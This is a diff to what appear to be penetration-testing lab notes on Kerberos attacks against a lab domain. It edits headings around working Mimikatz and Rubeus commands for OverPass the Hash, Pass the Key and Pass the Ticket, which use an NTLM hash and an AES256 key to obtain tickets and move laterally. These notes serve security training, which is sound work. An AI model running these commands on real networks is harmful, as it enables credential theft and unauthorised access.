@@ -60,18 +60,19 @@ mimikatz.exe privilege::debug "sekurlsa::ekeys"
 ```
 after we got the keys we can use Mimikatz or Rubeus to Get the `TGT`
 
-### Mimikatz - Pass the Key or OverPass the Hash
+### Mimikatz - Pass the Key or OverPass the Hash (Get `TGT`)
+This will create a new cmd.exe window that we can use to request access to any service we want in the context of the target user.
 ```powershell
 mimikatz.exe privilege::debug "sekurlsa::pth /domain:inlanefreight.htb /user:plaintext /ntlm:3f74aa8f08f712f09cd5177b5c1ce50f"
 ```
-### Rubeus - Pass the Key or OverPass the Hash
+### Rubeus - Pass the Key or OverPass the Hash (Get `TGT`)
 Note: Mimikatz requires administrative rights to perform the Pass the Key/OverPass the Hash attacks, while Rubeus doesn't.
 
 ```powershell
 Rubeus.exe  asktgt /domain:inlanefreight.htb /user:plaintext /aes256:b21c99fc068e3ab2ca789bccbef67de43791fd911c6e15ead25641a8fda3fe60 /nowrap
 ```
 
-## Pass the Ticket (PtT)
+## Pass the Ticket (PtT) (Get `TGS`)
 Now that we have some Kerberos tickets `TGT` , we can get some `TGS` and use them to move laterally within an environment.
 
 ### Rubeus - Pass the Ticket
